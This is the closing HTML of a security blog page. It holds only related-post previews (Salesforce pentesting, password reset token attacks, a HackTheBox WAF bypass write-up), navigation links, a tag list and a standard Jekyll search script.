
  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/salesforce-hacking/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1733094000"
  data-df="ll"
  
>
  Dec  2, 2024
</time>

              <h4 class="pt-0 my-2">Pentesting Salesforce Communities</h4>
              <div class="text-muted">
                <p>This blog post shows a recent penetration test I performed for some customers' Salesforce applications (also called Salesforce Communities), in which I exploited some common and other lesser-known flaws, which eventually led to an account takeover vulnerability. I will show some plugins and in-depth techniques to facilitate the enumeration of the target and the discovery of these flaws, and I will link to other excellent resources that I have found very useful for delving into the Salesforce attack surface and on which I have relied to conduct tests and write this article.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/hacking-custom-reset-password-tokens/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1684188000"
  data-df="ll"
  
>
  May 16, 2023
</time>

              <h4 class="pt-0 my-2">Defeating custom password reset tokens</h4>
              <div class="text-muted">
                <p>This blog post presents a detailed analysis of two successful account takeover scenarios resulting from vulnerabilities in a forgot password implementation. I explore techniques involving anti-tampering token prediction and time-based/sandwich attacks.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/waf-bypass-exploiting-parser-differentials/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1681250400"
  data-df="ll"
  
>
  Apr 12, 2023
</time>

              <h4 class="pt-0 my-2">WAF bypass and vulnerability chain exploiting parser differentials</h4>
              <div class="text-muted">
                <p>HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/blunder/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>HackTheBox - Blunder</p>
    </a>
  

  
    <a
      href="/posts/waf-bypass-exploiting-parser-differentials/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>WAF bypass and vulnerability chain exploiting parser differentials</p>
    </a>
  
</nav>

            

            <footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>¬©
    <time>2026</time>

    
      <a href="https://github.com/0xb120">0xbro</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>
   Powered by ‚òï, üêõüêúüêû, vulnerabilities and exploits
  </p>
</footer>
          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

